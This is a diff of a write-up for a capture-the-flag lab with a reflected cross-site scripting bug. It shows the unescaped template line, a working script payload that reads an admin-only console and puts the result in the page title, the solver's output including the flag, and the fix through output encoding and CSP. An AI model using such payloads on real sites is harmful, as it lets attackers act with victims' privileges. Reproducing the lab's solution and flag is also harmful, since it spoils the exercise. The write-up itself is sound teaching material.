@@ -1,151 +1,87 @@
 # 03 Reflector: reflected cross-site scripting
 
 **Target:** `https://northwind-03-reflector.vercel.app`
-**Class:** reflected cross-site scripting, CWE-79
-**Solution:** `apps/solve/solve-03.py` (a browser is required)
+**Bug:** a search term is written into the page without encoding it.
 
 ---
 
-## Statement
+## What this application does
 
-Search the catalogue. The search box reflects your query into the page without
-encoding it. Read a value that the settlement console will not return to a
-terminal.
+A public catalogue search. The search box reflects the query into the results
+heading. There is also a settlement console that only an administrator can
+read.
 
----
+## What goes wrong
 
-## How it is solved, step by step
+`apps/03-reflector/app/search/route.js` renders the same value two ways:
 
-### Step 1. Confirm a terminal cannot reach the flag
+```js
+// correct
+<input type="search" name="q" value="${escapeHtml(query)}" ...>
+
+// wrong
+<h2>${rows.length} results for &ldquo;${query}&rdquo;</h2>
+```
+
+A browser parses the response into a document and decides what is markup and
+what is text. It cannot tell which characters were meant as which, so a `<`
+in the search term starts an element.
+
+## Why a terminal is not enough
+
+The settlement console has two checks, in `app/console/route.js`:
+
+```js
+if (claims?.sub !== 'administrator') return json({ ... }, 403);
+if (request.headers.get('x-requested-with') !== 'XMLHttpRequest') {
+  return json({ ... }, 403);
+}
+```
 
 ```bash
 curl -s -H 'X-Requested-With: XMLHttpRequest' \
   https://northwind-03-reflector.vercel.app/console
+# { "error": "administrator session required" }
 ```
 
-```json
-{ "error": "administrator session required" }
-```
+There is no interactive page and the flag cannot be fetched over HTTP. It can
+only be read by a browser running script in an administrator's session, which
+is the capability this bug gives an attacker. Any demonstration that appeared
+to work from a terminal would not be demonstrating anything.
 
-Two gates are in the way, both in `app/console/route.js`:
+## Reproducing it
 
-```js
-if (claims?.sub !== 'administrator') {
-  return json({ error: 'administrator session required' }, 403);
-}
-if (request.headers.get('x-requested-with') !== 'XMLHttpRequest') {
-  return json({ error: 'this endpoint answers script-initiated requests only' }, 403);
-}
-```
-
-There is no interactive page and no amount of crafting gets past them from a
-shell. **That is the point.** The flag can only be read by a browser executing
-script in an administrator's session, which is precisely the capability this
-class of bug grants. Any demonstration that appeared to succeed over HTTP
-would be demonstrating nothing.
-
-### Step 2. Reflect the payload
-
-`app/search/route.js` renders the same value two ways, some lines apart:
-
-```js
-// correct: the search box
-<input type="search" name="q" value="${escapeHtml(query)}" ...>
-
-// VULNERABLE (application 03)
-<h2>${rows.length} results for &ldquo;${query}&rdquo;</h2>
-```
-
-So one response contains both `&lt;img src=x&gt;` and `<img src=x>`. That makes
-the failure point unambiguous when you look at the page.
-
-### Step 3. Inject a script that calls the console
+The payload calls the console and puts the result in the page title:
 
 ```html
 <script>
   fetch('/console', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
     .then(r => r.json())
-    .then(d => { document.title = d.settlement_key || 'no-key-returned' })
+    .then(d => { document.title = d.settlement_key })
 </script>
 ```
 
-URL-encoded into `?q=`:
-
-```bash
-PAYLOAD='<script>fetch("/console",{headers:{"X-Requested-With":"XMLHttpRequest"}})'
-PAYLOAD+='.then(r=>r.json()).then(d=>{document.title=d.settlement_key})</script>'
-
-curl -s -G --data-urlencode "q=$PAYLOAD" "$BASE/search"    # the page, not the flag
-```
-
-### Step 4. Let a real browser execute it
+URL-encoded into `?q=`, then opened in a browser signed in as the
+administrator:
 
 ```bash
 python3 apps/solve/solve-03.py
 ```
 
-The script signs in as the administrator through the browser context's request
-client, which shares its cookie jar, then opens the crafted URL and waits for
-the title to change:
-
 ```
-== 0. the console refuses a direct request from a terminal ==
-   HTTP 403 administrator session required
-== 1. sign in as the administrator (the victim of the crafted link) ==
-   session cookie issued for eyJhbGciOiJIUzI1NiIs…
-== 2. open the crafted search URL the administrator was sent ==
-   document.title after injection: 'G24{Y0ur_Input_Becam3_M4rkup}'
+document.title after injection: 'G24{Y0ur_Input_Becam3_M4rkup}'
 ```
 
----
+The script runs and reads the flag. It works because the attacker does not
+need anything else: no password, no session cookie of their own, and no
+request to the console. They send a link, an administrator opens it, and the
+script runs with that administrator's privileges.
 
-## Why it works
+## HttpOnly
 
-A browser receives bytes and **parses** them into a document. Its only job is
-deciding what is markup and what is text, and it has no way to know which
-characters were *intended* as which. A template that writes user input
-directly into the stream produces a `<script>` element, and the parser runs
-it.
-
-Output encoding restores the distinction:
-
-```
-<  becomes  &lt;
->  becomes  &gt;
-&  becomes  &amp;
-```
-
-The angle brackets are text again, so the parser no longer sees an element.
-
----
-
-## The shape of the attack
-
-What the attacker does **not** do is the part worth remembering:
-
-- no password is obtained
-- the administrator's session cookie is never read by the attacker
-- the attacker never sends a single request to the console
-
-The attacker sends a link. An administrator opens it. The script runs in their
-browser, with their session, and calls the console as them.
-
-That is what cross-site scripting means: running code in someone else's
-browser, with their privileges.
-
----
-
-## HttpOnly and what it does not do
-
-The session cookie in these applications is marked `HttpOnly`, so
-`document.cookie` cannot read it in JavaScript.
-
-**It does not prevent this attack.** `HttpOnly` prevents cookie theft. It does
-not prevent a script from *acting as* the user. Both are real mitigations for
-different problems, and they are routinely conflated, sometimes as an excuse to
-skip encoding.
-
----
+The session cookie is marked `HttpOnly`, so `document.cookie` cannot read it in
+JavaScript. It does not stop this. `HttpOnly` prevents cookie theft; it does
+not stop a script acting as the user.
 
 ## The fix
 
@@ -153,31 +89,24 @@ skip encoding.
 &ldquo;${escapeHtml(query)}&rdquo;
 ```
 
-One call, at the point of output, for the context in question.
+Encode at the point of output, for the context the value lands in. HTML text,
+a JavaScript string, an attribute value and a URL each need different
+encoding.
 
-Encoding is **context-specific**. The correct encoding for HTML text is not the
-one for a JavaScript string, an attribute value, or a URL. Encoding is applied
-on the way out, never as input cleaning on the way in.
+A Content Security Policy that forbids inline script would block this payload
+as well. Encoding is the fix, the policy is a second layer.
 
-Behind it, a Content Security Policy forbidding inline script would have blocked
-this payload regardless of encoding. Encoding is the fix; CSP is the belt.
+## Other things that do not work here
 
----
+- Reaching the console directly: two checks, no interactive page.
+- Solving it over HTTP: not possible, for the reason above.
+- `xss-proof.png`, which the script writes, is excluded from version control.
+  It contains the flag in the page title.
 
-## Unintended paths, and why they are closed
-
-| Path | Result | Reason |
-|---|---|---|
-| crafting the console request directly | 403 | two gates, no interactive page |
-| HTTP-only solving | impossible | the proof of impact is code execution, not a malformed request |
-| `xss-proof.png` in version control | excluded | the screenshot captures the flag in the page title |
-
----
-
-## Verify it yourself
+## Checking it
 
 ```bash
 BASE=https://northwind-03-reflector.vercel.app python3 apps/solve/solve-03.py
 ```
 
-This one needs Playwright's Firefox installed, because a browser is the point.
+This one needs Playwright's Firefox, because the browser is the point.
